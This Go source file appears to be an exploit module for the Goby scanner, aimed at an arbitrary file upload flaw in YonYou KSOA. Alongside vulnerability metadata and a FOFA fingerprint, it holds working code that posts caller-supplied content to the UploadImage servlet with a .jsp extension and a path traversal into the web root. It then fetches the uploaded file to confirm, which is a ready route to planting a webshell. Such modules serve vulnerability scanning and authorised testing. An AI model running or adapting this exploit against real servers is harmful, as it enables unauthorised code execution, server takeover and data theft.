package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YonYou KS OA Arbitrary File Upload Vulnerability",
    "Description": "<p>yonyou ksoa is a new generation product developed under the guidance of SOA concept. It is a unified IT infrastructure launched according to the cutting-edge it needs of circulation enterprises. It can make it systems established by circulation enterprises in various periods easy to talk to each other, help circulation enterprises protect their original IT investment, simplify it management, improve competitiveness, and ensure the realization of the overall strategic objectives and innovation activities of the enterprise. </p><p>Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Impact": "YonYou KS OA Arbitrary File Upload Vulnerability",
    "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "Product": "yonyou-KSOA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA 任意文件上传漏洞",
            "Description": "<p>用友时空 KSOA 是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的IT需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友时空 KSOA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友时空 KSOA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新。<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Product": "用友-时空KSOA",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "YonYou KS OA Arbitrary File Upload Vulnerability",
            "Description": "<p>yonyou&nbsp;ksoa is a new generation product developed under the guidance of SOA concept. It is a unified IT infrastructure launched according to the cutting-edge it needs of circulation enterprises. It can make it systems established by circulation enterprises in various periods easy to talk to each other, help circulation enterprises protect their original IT investment, simplify it management, improve competitiveness, and ensure the realization of the overall strategic objectives and innovation activities of the enterprise.&nbsp;</p><p><span style=\"color: var(--primaryFont-color);\">Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</span><br></p>",
            "Impact": "YonYou KS OA Arbitrary File Upload Vulnerability",
            "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Product": "yonyou-KSOA",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2022-05-25",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%out.print(\"123\");%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7089"
}`

	exploitUploadImage1231i3291 := func(fileContent string, host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewPostRequestConfig("/servlet/com.sksoft.v8.desktop.UploadImage?fileextr=.jsp&rpath=../webapps/ROOT/")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "multipart/form-data")
		requestConfig.Data = fileContent
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".jsp") {
				return regexp.MustCompile(`(\d+\.jsp)`).FindStringSubmatch(resp.RawBody)[1]
			}
		}
		return ""
	}
	checkUploadImage1231i3291 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/" + fileName)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand := goutils.RandomHexString(6)
			fileName := exploitUploadImage1231i3291("<%out.print(\""+rand+"\");%>", u)
			if fileName != "" {
				return checkUploadImage1231i3291(fileName, rand, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileContent := ss.Params["fileContent"].(string)
			fileName := exploitUploadImage1231i3291(fileContent, expResult.HostInfo)
			if fileName != "" {
				expResult.Success = true
				expResult.Output = "文件上传已成功，请检查路径：/" + fileName
			}
			return expResult
		},
	))
}
